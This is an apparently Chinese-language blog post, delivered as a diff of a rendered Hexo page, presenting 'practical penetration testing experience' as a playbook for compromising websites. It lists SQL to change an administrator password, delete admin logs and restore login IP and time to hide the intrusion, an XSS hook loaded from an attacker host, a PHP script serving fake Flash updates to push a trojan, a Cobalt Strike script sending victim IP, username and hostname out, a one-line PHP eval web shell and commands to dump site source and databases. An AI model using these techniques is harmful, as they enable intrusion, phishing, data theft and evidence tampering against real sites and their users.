@@ -1,37 +1,683 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+  
 
 
-{% block content %}
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透 网络安全 网安 网路攻防 PHP 服务器" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="渗透测试之实战经验一些思路目前可进入目标网站后台和后续的渗透思路有以下一些：1、修改后台登录入口嗅探登录的用户和密码；2、通过加密算法生成密文字典进行撞库攻击；3、通过加密算法生成密文后进入数据库修改；4、XSS打Cookie或Flash水坑钓鱼等攻击方式；5、APK中注入恶意程序，替换APK的下载地址；   数据库的一些操作1、查询管理员用户：   1SELECT * FROM &#96;cmf_use">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试之实战经验">
+<meta property="og:url" content="https://shentoux.github.io/2022/11/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/index.html">
+<meta property="og:site_name" content="渗透测试经验及技巧">
+<meta property="og:description" content="渗透测试之实战经验一些思路目前可进入目标网站后台和后续的渗透思路有以下一些：1、修改后台登录入口嗅探登录的用户和密码；2、通过加密算法生成密文字典进行撞库攻击；3、通过加密算法生成密文后进入数据库修改；4、XSS打Cookie或Flash水坑钓鱼等攻击方式；5、APK中注入恶意程序，替换APK的下载地址；   数据库的一些操作1、查询管理员用户：   1SELECT * FROM &#96;cmf_use">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-11-13T06:05:02.963Z">
+<meta property="article:modified_time" content="2022-11-13T06:05:02.963Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://shentoux.github.io/2022/11/13/渗透测试之实战经验/"/>
+
+
+
+
+
+  <title>渗透测试之实战经验 | 渗透测试经验及技巧</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">渗透测试经验及技巧</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shentoux.github.io/2022/11/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试经验及技巧">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">渗透测试之实战经验</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-11-13T14:05:02+08:00">
+                2022-11-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="渗透测试之实战经验"><a href="#渗透测试之实战经验" class="headerlink" title="渗透测试之实战经验"></a>渗透测试之实战经验</h2><h5 id="一些思路"><a href="#一些思路" class="headerlink" title="一些思路"></a>一些思路</h5><p>目前可进入目标网站后台和后续的渗透思路有以下一些：<br>1、修改后台登录入口嗅探登录的用户和密码；<br>2、通过加密算法生成密文字典进行撞库攻击；<br>3、通过加密算法生成密文后进入数据库修改；<br>4、XSS打Cookie或Flash水坑钓鱼等攻击方式；<br>5、APK中注入恶意程序，替换APK的下载地址；  </p>
+<h5 id="数据库的一些操作"><a href="#数据库的一些操作" class="headerlink" title="数据库的一些操作"></a>数据库的一些操作</h5><p>1、查询管理员用户：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `cmf_users` WHERE `user_login`=<span class="string">&#x27;B8V9nAV&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>2、查询多少用户在用这个密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `cmf_users` WHERE FIND_IN_SET(<span class="string">&#x27;###08e3756d043515f77e8de4f5deb00496&#x27;</span>,user_pass);</span><br></pre></td></tr></table></figure>
+<p>3、查询最近登录用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `cmf_users` ORDER BY last_login_time DESC;</span><br></pre></td></tr></table></figure>
+<p>4、修改管理员密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `cmf_users` SET `user_pass`=<span class="string">&#x27;###73b13b8b4d767f6c3c2953f123d1a721&#x27;</span> WHERE (`user_login`=<span class="string">&#x27;B8V9nAV&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>5、删除管理员日志并重新按ID进行排序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM `cmf_admin_log` WHERE (`<span class="built_in">id</span>`&gt;=<span class="string">&#x27;4175&#x27;</span>);ALTER TABLE cmf_admin_log AUTO_INCREMENT = 1;</span><br></pre></td></tr></table></figure>
+<p>6、恢复管理员密码并替换最后登录IP和时间：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `cmf_users` SET `user_pass`=<span class="string">&#x27;###08e3756d043515f77e8de4f5deb00496&#x27;</span>,`last_login_ip`=<span class="string">&#x27;122.60.22.247&#x27;</span>,`last_login_time`=<span class="string">&#x27;2020-07-23 05:41:06&#x27;</span> WHERE (`user_login`=<span class="string">&#x27;B8V9nAV&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h5 id="xss脚本"><a href="#xss脚本" class="headerlink" title="xss脚本"></a>xss脚本</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://ip或者域名/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>没有服务器可以上传到github上去</p>
+<h5 id="渗透后得到交互式的终端"><a href="#渗透后得到交互式的终端" class="headerlink" title="渗透后得到交互式的终端"></a>渗透后得到交互式的终端</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<h5 id="渗透后打包网站源码导出数据库操作"><a href="#渗透后打包网站源码导出数据库操作" class="headerlink" title="渗透后打包网站源码导出数据库操作"></a>渗透后打包网站源码导出数据库操作</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf backend.tar /www/wwwroot/backend/</span><br><span class="line">mysqldump -h127.0.0.1 -uroot -proot --databases MH***hN | gzip &gt; backend.sql.gz</span><br><span class="line">gunzip backend.sql.gz</span><br></pre></td></tr></table></figure>
+<h5 id="mysql无交互的情况下盲输语句"><a href="#mysql无交互的情况下盲输语句" class="headerlink" title="mysql无交互的情况下盲输语句"></a>mysql无交互的情况下盲输语句</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">se sb_wiiudot_cn;</span><br><span class="line">show tables;</span><br><span class="line">desc app_admin;</span><br><span class="line">select * from app_admin;</span><br><span class="line">select * from app_admin_cate;</span><br><span class="line">EOF</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
+<h3 id="APP相关思路"><a href="#APP相关思路" class="headerlink" title="APP相关思路"></a>APP相关思路</h3><p>360显微镜，腾讯金刚的app漏洞测试平台去测试</p>
+<h4 id="app敏感数据提取"><a href="#app敏感数据提取" class="headerlink" title="app敏感数据提取"></a>app敏感数据提取</h4><p>推荐一款好用的工具apkAnalyser,一个appscan平台，地址为：<br><a target="_blank" rel="noopener" href="https://www.appscan.io/">appscan平台</a><br>邮箱注册一个账号，上传app就可以进行扫描提取数据信息。</p>
+<h5 id="渗透后网页挂马系列"><a href="#渗透后网页挂马系列" class="headerlink" title="渗透后网页挂马系列"></a>渗透后网页挂马系列</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_mobile() == <span class="string">&quot;手机端&quot;</span>)&#123;</span><br><span class="line">  die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 为手工模式</span></span><br><span class="line"><span class="comment">#2 为自动化模式</span></span><br><span class="line"><span class="comment">#3 当为其他值 则不工作</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$type</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"></span><br><span class="line">switch (<span class="variable">$type</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#echo &#x27;window.location.href = &quot;https://你得URL地址/&quot;;&#x27;;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ip</span> == <span class="string">&quot;1.1.1.1&quot;</span> or <span class="variable">$ip</span> == <span class="string">&quot;1.1.1.1&quot;</span>)&#123;</span><br><span class="line">          <span class="comment">#echo &#x27;alert(&quot;Adobe Flash Payler 已经准备好安装，请刷新后继续下载安装.&quot;);&#x27;;</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="string">&#x27;alert(&quot;登陆已失效，请重新登陆.&quot;);&#x27;</span>;</span><br><span class="line">          <span class="built_in">echo</span> <span class="string">&#x27;window.location.href = &quot;https://你得URL地址/401.php&quot;;&#x27;</span>;</span><br><span class="line">          die;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // <span class="comment">#对话通知</span></span><br><span class="line">        // <span class="keyword">if</span>(<span class="variable">$ip</span> == <span class="string">&quot;1.1.1.1&quot;</span>)&#123;</span><br><span class="line">        //   <span class="comment">#echo &#x27;alert(&quot;Adobe Flash Payler 更新完成，还需要你完成最后一个操作，请务必允许此次操作，否则可能将导致网页无法正常执行.&quot;);&#x27;;</span></span><br><span class="line">        //   <span class="built_in">echo</span> <span class="string">&#x27;alert(&quot;即将开始安装Adobe Flash Payler自更新计划任务，请务必允许添加，否则将可能导致网页无法正常浏览。&quot;);&#x27;</span>;</span><br><span class="line">        //   <span class="comment">#echo &#x27;alert(&quot;Adobe Flash Payler 安装失败，由于你的网络较差导致更新被断开，请重新更新文件!&quot;);&#x27;;</span></span><br><span class="line">        //   <span class="comment">#echo &#x27;window.location.href = &quot;https://你得URL地址/&quot;;&#x27;;</span></span><br><span class="line">        //   die;</span><br><span class="line">        // &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;Adobe Flash Payler 检测更新.&#x27;</span>;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">        //判断该目标是否已经在被控之中，如果有则不在钓鱼</span><br><span class="line">        <span class="variable">$db</span>-&gt;<span class="built_in">bind</span>(<span class="string">&quot;ip&quot;</span>,<span class="variable">$ip</span>);</span><br><span class="line">        <span class="variable">$Query_user_is</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&quot;select * from 入库 where ip = :ip&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Query_user_is</span>)&#123;</span><br><span class="line">            die;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // //判断该目标是否下载了木马，如果没下载则弹出，下载后等待180s 用于用户安装。</span><br><span class="line">        <span class="variable">$db</span>-&gt;<span class="built_in">bind</span>(<span class="string">&quot;ip&quot;</span>,<span class="variable">$ip</span>);</span><br><span class="line">        <span class="variable">$db</span>-&gt;<span class="built_in">bind</span>(<span class="string">&quot;type&quot;</span>,<span class="string">&quot;下载了Flash木马&quot;</span>);</span><br><span class="line">        <span class="variable">$Query_fishing_is</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&quot;select * from 入库 where ip = :ip and type = :type&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Query_fishing_is</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$down_time</span> = strtotime(end(<span class="variable">$Query_fishing_is</span>)[<span class="string">&#x27;request_time&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$time</span> = time();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$end_time</span> = <span class="variable">$time</span> - <span class="variable">$down_time</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="variable">$sx_time</span> = 200 - <span class="variable">$end_time</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$end_time</span> &lt; <span class="string">&quot;200&quot;</span>)&#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&#x27;window.location.href = &quot;https://你得URL地址/&quot;;&#x27;</span>;</span><br><span class="line">                // <span class="built_in">echo</span> <span class="string">&#x27;alert(&quot;正在安装 Adobe Flash Player 最新版本，请稍等 &#x27;</span>.<span class="variable">$sx_time</span>.<span class="string">&#x27; 秒&quot;)&#x27;</span>;</span><br><span class="line">                die;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&#x27;Adobe Flash Payler 检测更新.&#x27;</span>;</span><br><span class="line">                die;</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">          <span class="built_in">echo</span> <span class="string">&#x27;window.location.href = &quot;https://你得URL地址/&quot;;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line"></span><br><span class="line">  default:</span><br><span class="line">    die;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="cs相关"><a href="#cs相关" class="headerlink" title="cs相关"></a>cs相关</h6><p>循环获取所有beacon</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">on beacon_initial &#123;</span><br><span class="line"></span><br><span class="line">    sub http_get &#123;</span><br><span class="line">        <span class="built_in">local</span>(<span class="string">&#x27;$output&#x27;</span>);</span><br><span class="line">        <span class="variable">$url</span> = [new java.net.URL: <span class="variable">$1</span>];</span><br><span class="line">        <span class="variable">$stream</span> = [<span class="variable">$url</span> openStream];</span><br><span class="line">        <span class="variable">$handle</span> = [SleepUtils getIOHandle: <span class="variable">$stream</span>, <span class="variable">$null</span>];</span><br><span class="line"></span><br><span class="line">        @content = readAll(<span class="variable">$handle</span>);</span><br><span class="line"></span><br><span class="line">        foreach <span class="variable">$line</span> (@content) &#123;</span><br><span class="line">            <span class="variable">$output</span> .= <span class="variable">$line</span> . <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        println(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#获取ip、计算机名、登录账号</span></span><br><span class="line">    <span class="variable">$internalIP</span> = replace(beacon_info(<span class="variable">$1</span>, <span class="string">&quot;internal&quot;</span>), <span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">    <span class="variable">$userName</span> = replace(beacon_info(<span class="variable">$1</span>, <span class="string">&quot;user&quot;</span>), <span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">    <span class="variable">$computerName</span> = replace(beacon_info(<span class="variable">$1</span>, <span class="string">&quot;computer&quot;</span>), <span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get一下Server酱的链接</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&#x27;https://sc.ftqq.com/此处填写你Server酱的SCKEY码.send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&amp;desp=%e4%bb%96%e6%9d%a5%e4%ba%86%e3%80%81%e4%bb%96%e6%9d%a5%e4%ba%86%ef%bc%8c%e4%bb%96%e8%84%9a%e8%b8%8f%e7%a5%a5%e4%ba%91%e8%b5%b0%e6%9d%a5%e4%ba%86%e3%80%82%0D%0A%0D%0Aip:&#x27;</span>.<span class="variable">$internalIP</span>.<span class="string">&#x27;%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:&#x27;</span>.<span class="variable">$userName</span>.<span class="string">&#x27;%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:&#x27;</span>.<span class="variable">$computerName</span>;</span><br><span class="line"></span><br><span class="line">    http_get(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="命令执行echo写码"><a href="#命令执行echo写码" class="headerlink" title="命令执行echo写码"></a>命令执行echo写码</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$echo</span> <span class="string">&#x27;&lt;? php @eval($_POST[&quot;x&quot;]); ?&gt;&#x27;</span> &gt;/www/wwwroot/mzysqcq.cn/uploads/20200701/shell.php</span><br></pre></td></tr></table></figure>
+<p>###一些常用的技巧</p>
+<h4 id="csv文件合并"><a href="#csv文件合并" class="headerlink" title="csv文件合并"></a>csv文件合并</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$find</span> /path/to/directory/ -name *.csv -print0 | xargs -0 -I file <span class="built_in">cat</span> file &gt; merged.file</span><br><span class="line"><span class="variable">$find</span> /path/to/directory/ -name *.csv -<span class="built_in">exec</span> <span class="built_in">cat</span> &#123;&#125; + &gt; merged.file</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/11/13/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%20Github%20%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A%EF%BC%9F/" rel="next" title="如何利用 Github 搭建自己的免费图床">
+                <i class="fa fa-chevron-left"></i> 如何利用 Github 搭建自己的免费图床
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          </div>
+          
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C"><span class="nav-number">1.</span> <span class="nav-text">渗透测试之实战经验</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">一些思路</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">数据库的一些操作</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#xss%E8%84%9A%E6%9C%AC"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">xss脚本</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E5%90%8E%E5%BE%97%E5%88%B0%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%9A%84%E7%BB%88%E7%AB%AF"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">渗透后得到交互式的终端</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" 